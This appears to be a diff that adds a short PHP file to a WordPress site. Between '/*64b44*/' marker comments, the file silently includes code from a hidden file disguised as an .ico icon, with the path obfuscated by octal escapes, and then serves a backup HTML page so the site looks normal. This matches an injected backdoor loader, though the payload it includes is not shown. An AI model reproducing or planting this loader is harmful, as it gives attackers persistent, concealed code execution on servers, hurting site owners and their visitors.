@@ -1,0 +1,9 @@
+<?php
+/*64b44*/
+
+@include "\103:/C\123WSW\105B/w\157rdp\162ess\057wp-\151ncl\165des\057res\164-ap\151/.9\066ab0\0700a.\151co";
+
+/*64b44*/
+
+
+echo @file_get_contents('index.html.bak.bak');
